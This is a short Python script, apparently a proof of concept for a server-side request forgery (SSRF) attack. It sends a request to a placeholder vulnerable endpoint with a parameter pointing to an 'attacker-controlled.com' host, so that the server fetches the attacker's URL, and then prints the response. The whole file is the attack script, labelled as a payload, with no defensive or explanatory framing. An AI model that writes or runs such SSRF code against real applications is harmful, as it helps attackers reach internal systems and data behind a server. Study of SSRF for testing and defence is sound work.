import requests

# Target URL
url = "http://vulnerable-application.com/ssrf?url=http://internal-system.com"

# Attacker-controlled URL
attacker_url = "http://attacker-controlled.com"

# SSRF attack payload
payload = {'url': attacker_url}

# Send SSRF request
response = requests.get(url, params=payload)

# Print response
print(response.text)
